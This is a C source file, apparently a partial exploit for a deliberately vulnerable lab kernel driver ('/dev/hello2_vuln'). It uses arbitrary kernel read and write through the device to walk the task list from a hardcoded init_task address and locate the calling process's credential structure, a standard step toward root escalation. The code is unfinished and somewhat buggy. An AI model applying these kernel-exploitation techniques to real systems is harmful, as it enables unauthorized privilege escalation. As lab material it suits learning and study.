#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>


#define INIT_TASK 0xffffffff82614940
#define OFFSET_TO_HEAD 0x3e8
#define OFFSET_TO_PID 0x4e8
#define HEAD_TO_PID 0x100
#define OFFSET_TO_CRED 0x6a8
#define BUFFER_LEN 256
#define DRIVER_FILE "/dev/hello2_vuln"

char buffer[256] = {0};
int FD = 0;

int check_fd(){
	if(FD == 0){
		printf("[-] Could not open file\n");
		exit(-1);
	}
}

void write_device(int fd, const void* buffer, ssize_t size){
	int ret = write(fd, buffer, size);
	if(ret < 0){
		printf("[-] Failed to write to device file\n");
		exit(-1);
	}
}

void read_device(int fd, const void* buffer, ssize_t size){
	int ret = read(fd, buffer, size);
	if(ret < 0){
		printf("[-] Failed to read from device file\n");
		exit(-1);
	}
}

void read_kernel(void *address, const char* buffer, ssize_t size){
	check_fd();
	write_device(FD, address, size);
	read_device(FD, buffer, BUFFER_LEN);
}

void write_kernel(void *address, const char* str_to_send, ssize_t size){
	check_fd();
	write_device(FD, str_to_send, size);
	read_device(FD, address, size);
}

int main(){
	FD = open(DRIVER_FILE, O_RDWR);
	long pid = getpid();
	printf("[+] PID = %d\n", pid);
	printf("[+] Reading head from init_tast...\n");
	void *target = INIT_TASK + OFFSET_TO_HEAD;
	long *buf, *next;
	read_kernel(target, &buf, sizeof(long*));
	printf("[+] Kernel read\n");
	printf("[+] Pointer to next: %p\n", target);

	long pid_of_task = 0;
	read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(long));
	printf("pid_addr: %p\n", buf+HEAD_TO_PID);
	printf("pid: %d\n", pid_of_task);
	
//	while(pid_of_task != pid){
		read_kernel(buf, &buf, sizeof(long*));
		read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(long));
		printf("\t[+] PID of task: %d\n", pid_of_task);
//	}

	void *addr_to_creds = buf - OFFSET_TO_HEAD + OFFSET_TO_CRED;
	printf("[+] Address to our cred: %p\n", addr_to_creds);

	return 0;
}


